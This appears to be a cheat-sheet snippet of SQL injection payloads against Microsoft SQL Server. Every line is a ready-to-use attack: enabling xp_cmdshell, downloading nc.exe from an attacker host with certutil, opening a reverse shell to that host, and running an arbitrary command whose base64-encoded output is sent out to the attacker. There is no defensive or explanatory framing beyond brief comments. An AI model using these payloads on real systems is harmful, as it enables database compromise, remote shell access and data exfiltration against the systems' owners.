```shell
admin' EXEC sp_configure 'show advanced options', 1; RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;exec xp_cmdshell 'certutil -urlcache -f http://$ATTACKER_IP/nc.exe c:\windows\temp\nc.exe' -- - # Download nc.exe

admin' EXEC sp_configure 'show advanced options', 1; RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;exec xp_cmdshell 'c:\windows\temp\nc.exe $ATTACKER_IP 1337 -e cmd' -- - # Get reverse shell
```

```shell
admin' EXEC sp_configure 'show advanced options', 1; RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;declare @r varchar(4120),@cmdOutput varchar(4120);declare @res TABLE(line varchar(max));insert into @res exec xp_cmdshell '$COMMAND';set @cmdOutput=(select (select cast((select line+char(10) COLLATE SQL_Latin1_General_CP1253_CI_AI as 'text()' from @res for xml path('')) as varbinary(max))) for xml path(''),binary base64);set @r=concat('certutil -urlcache -f https://$ATTACKER_IP/',@cmdOutput);exec xp_cmdshell @r; # Replace the $COMMAND by shell command, open web server and get result in base64 
```